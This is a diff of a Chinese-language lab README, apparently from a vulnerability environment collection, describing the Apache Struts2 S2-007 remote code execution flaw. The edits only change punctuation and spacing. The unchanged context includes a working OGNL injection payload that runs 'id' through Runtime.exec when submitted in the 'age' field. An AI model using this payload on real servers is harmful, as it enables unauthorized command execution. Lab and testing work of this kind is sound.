@@ -1,7 +1,7 @@
 # S2-007 远程代码执行漏洞
 
-影响版本: 2.0.0 - 2.2.3
-漏洞详情: http://struts.apache.org/docs/s2-007.html
+影响版本：2.0.0 - 2.2.3
+漏洞详情：http://struts.apache.org/docs/s2-007.html
 
 ## 测试环境搭建
 
@@ -53,12 +53,12 @@ public class UserAction extends ActionSupport {
 
 ## Exploit
 
-@rickgray 在原文中只给了弹计算器的POC，我给出执行任意代码的EXP：
+@rickgray 在原文中只给了弹计算器的 POC，我给出执行任意代码的 EXP：
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
 ```
 
-将Exp传入可以利用的输入框（age），得到命令执行结果：
+将 Exp 传入可以利用的输入框（age），得到命令执行结果：
 
 ![](1.jpeg)
